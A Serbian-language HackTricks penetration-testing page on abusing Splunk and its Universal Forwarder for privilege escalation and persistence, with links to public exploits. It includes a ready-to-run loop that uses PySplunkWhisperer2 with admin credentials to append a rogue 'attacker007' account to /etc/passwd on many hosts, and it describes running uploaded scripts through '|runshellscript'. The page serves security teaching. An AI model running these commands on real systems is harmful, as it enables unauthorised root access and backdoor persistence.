# Splunk LPE and Persistence

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

Ako **enumerišete** mašinu **internim** ili **eksternim** putem i pronađete da je **Splunk pokrenut** (port 8090), ako srećom znate **validne akreditive**, možete **zloupotrebiti Splunk servis** da biste **izvršili shell** kao korisnik koji pokreće Splunk. Ako je root pokrenut, možete eskalirati privilegije na root.

Takođe, ako već imate root privilegije i Splunk servis ne sluša samo na localhost-u, možete **ukrasti** fajl sa **lozinkama** iz Splunk servisa i **probijati** lozinke, ili **dodati nove** akreditive. I održavati postojanost na hostu.

Na prvoj slici ispod možete videti kako izgleda Splunkd web stranica.

## Sažetak eksploatacije Splunk Universal Forwarder Agent-a

Za dalje detalje pogledajte post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:

**Pregled eksploatacije:** Eksploatacija koja cilja Splunk Universal Forwarder Agent (UF) omogućava napadačima sa lozinkom agenta da izvrše proizvoljni kod na sistemima koji pokreću agenta, potencijalno kompromitujući celu mrežu.

**Ključne tačke:**

* UF agent ne validira dolazne konekcije ili autentičnost koda, što ga čini ranjivim na izvršavanje neovlašćenog koda.
* Uobičajeni načini dobijanja lozinki uključuju pronalaženje istih u mrežnim direktorijumima, deljenim fajlovima ili internim dokumentima.
* Uspela eksploatacija može dovesti do pristupa na nivou SYSTEM-a ili root-a na kompromitovanim hostovima, eksfiltracije podataka i daljnje infiltracije u mrežu.

**Izvršavanje eksploatacije:**

1. Napadač dobija lozinku UF agenta.
2. Koristi Splunk API za slanje komandi ili skripti agentima.
3. Moguće akcije uključuju ekstrakciju fajlova, manipulaciju korisničkim nalozima i kompromitaciju sistema.

**Uticaj:**

* Potpuna kompromitacija mreže sa privilegijama na nivou SYSTEM-a/root-a na svakom hostu.
* Mogućnost onemogućavanja logovanja radi izbegavanja detekcije.
* Instalacija zadnjih vrata ili ransomware-a.

**Primer komande za eksploataciju:**

```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```

**Upotrebljivi javni eksploiti:**

* https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2
* https://www.exploit-db.com/exploits/46238
* https://www.exploit-db.com/exploits/46487

## Zloupotreba Splunk upita

**Za dodatne detalje pogledajte post** [**https://blog.hrncirik.net/cve-2023-46214-analysis**](https://blog.hrncirik.net/cve-2023-46214-analysis)

**CVE-2023-46214** je omogućio otpremanje proizvoljnog skripta u **`$SPLUNK_HOME/bin/scripts`** i zatim je objašnjeno da se korišćenjem pretrage **`|runshellscript script_name.sh`** mogu **izvršiti** skripte koje su tamo smeštene.

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju oglašenu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
